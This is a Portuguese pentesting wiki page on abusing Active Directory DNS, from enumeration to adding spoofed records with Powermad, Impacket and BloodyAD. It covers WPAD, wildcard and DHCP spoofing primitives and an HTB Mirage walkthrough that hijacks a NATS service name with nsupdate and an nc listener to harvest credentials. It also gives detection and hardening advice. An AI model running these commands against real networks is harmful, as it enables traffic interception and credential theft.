# Registros DNS do AD

{{#include ../../banners/hacktricks-training.md}}

Por padrão, **qualquer usuário** no Active Directory pode **enumerar todos os registros DNS** nas zonas DNS do Domain ou da Forest, de forma semelhante a um **zone transfer** (os usuários podem listar os objetos filhos de uma zona DNS em um ambiente AD).

A ferramenta [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) permite a **enumeração** e a **exportação** de **todos os registros DNS** da zona para fins de recon de redes internas.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (abril de 2025) adiciona saída JSON/Greppable (`--json`), resolução DNS multi-threaded e suporte para TLS 1.2/1.3 ao estabelecer conexão com LDAPS

Para mais informações, leia [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Criando / Modificando registros (ADIDNS spoofing)

Como o grupo **Authenticated Users** possui **Create Child** na DACL da zona por padrão, qualquer conta de domínio (ou conta de computador) pode registrar registros adicionais. Isso pode ser usado para sequestro de tráfego, coerção de NTLM relay ou até mesmo para comprometer completamente o domínio.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py é distribuído com o Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Primitivas comuns de ataque

1. **Registro curinga** – `*.<zone>` transforma o servidor DNS do AD em um responder de toda a empresa, semelhante ao spoofing de LLMNR/NBNS. Pode ser abusado para capturar hashes NTLM ou retransmiti-los para LDAP/SMB.  (Requer que o WINS-lookup esteja desabilitado.)<sup>[[1]](#references)</sup>
2. **Sequestro de WPAD** – adicione `wpad` (ou um registro **NS** apontando para um host do atacante para contornar o Global-Query-Block-List) e faça proxy transparente das solicitações HTTP de saída para coletar credenciais. A Microsoft corrigiu os bypasses de wildcard/ DNAME (CVE-2018-8320), mas os **registros NS ainda funcionam**.<sup>[[1]](#references)</sup>
3. **Tomada de entrada obsoleta** – reivindique o endereço IP que pertencia anteriormente a uma workstation, e a entrada DNS associada continuará sendo resolvida, permitindo ataques de resource-based constrained delegation ou Shadow-Credentials sem tocar no DNS.
4. **DHCP → spoofing de DNS** – em uma implantação padrão de Windows DHCP+DNS, um atacante não autenticado na mesma sub-rede pode sobrescrever qualquer registro A existente (incluindo Domain Controllers) enviando solicitações DHCP forjadas que acionam atualizações dinâmicas de DNS (Akamai “DDSpoof”, 2023). Isso permite um machine-in-the-middle sobre Kerberos/LDAP e pode levar à tomada completa do domínio.<sup>[[2]](#references)</sup>
5. **Certifried (CVE-2022-26923)** – altere o `dNSHostName` de uma conta de máquina sob seu controle, registre um registro A correspondente e solicite um certificado para esse nome a fim de se passar pelo DC. Ferramentas como **Certipy** ou **BloodyAD** automatizam totalmente o fluxo.

---

### Sequestro de serviço interno via registros dinâmicos obsoletos (estudo de caso NATS)

Quando as atualizações dinâmicas permanecem abertas a todos os usuários autenticados, **um nome de serviço desregistrado pode ser reivindicado novamente e apontado para uma infraestrutura do atacante**. O DC Mirage HTB expôs o hostname `nats-svc.mirage.htb` após o DNS scavenging, então qualquer usuário com poucos privilégios poderia:<sup>[[3]](#references)</sup>

1. **Confirmar que o registro está ausente** e descobrir o SOA com `dig`:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Recrie o registro** apontando para uma interface externa/VPN sob seu controle:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Personifique o serviço plaintext**. Os clientes NATS esperam receber um banner `INFO { ... }` antes de enviar as credenciais, portanto copiar um banner legítimo do broker real é suficiente para coletar secrets:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Qualquer cliente que resolva o nome sequestrado fará imediatamente o leak de seu frame JSON `CONNECT` (incluindo `"user"`/`"pass"`) para o listener. Executar o binário oficial `nats-server -V` no host do atacante, desabilitar a redação dos logs ou simplesmente sniffar a sessão com o Wireshark produz as mesmas credenciais em plaintext, pois o TLS era opcional.

4. **Pivotar com as credenciais capturadas** – no Mirage, a conta NATS roubada fornecia acesso ao JetStream, que expunha eventos históricos de autenticação contendo usernames/passwords reutilizáveis do AD.

Esse padrão se aplica a todo serviço integrado ao AD que dependa de handshakes TCP não seguros (APIs HTTP, RPC, MQTT etc.): assim que o registro DNS é sequestrado, o atacante se torna o serviço.

---

## Detecção e hardening

* Negue a **Authenticated Users** o direito *Create all child objects* em zonas sensíveis e delegue as atualizações dinâmicas a uma conta dedicada usada pelo DHCP.
* Se atualizações dinâmicas forem necessárias, configure a zona como **Secure-only** e habilite **Name Protection** no DHCP, para que somente o objeto de computador proprietário possa sobrescrever seu próprio registro.
* Monitore os IDs de eventos 257/252 do DNS Server (atualização dinâmica), 770 (transferência de zona) e gravações LDAP em `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Bloqueie nomes perigosos (`wpad`, `isatap`, `*`) com um registro intencionalmente benigno ou por meio da Global Query Block List.
* Mantenha os servidores DNS atualizados – por exemplo, os bugs de RCE CVE-2024-26224 e CVE-2024-26231 atingiram **CVSS 9.8** e podem ser explorados remotamente contra Domain Controllers.

## Referências

- [1] [ADIDNS Revisited - WPAD, GQBL, and More](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, ainda a referência de facto para ataques de wildcard/WPAD)
- [2] [Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (dez. de 2023)
- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

{{#include ../../banners/hacktricks-training.md}}
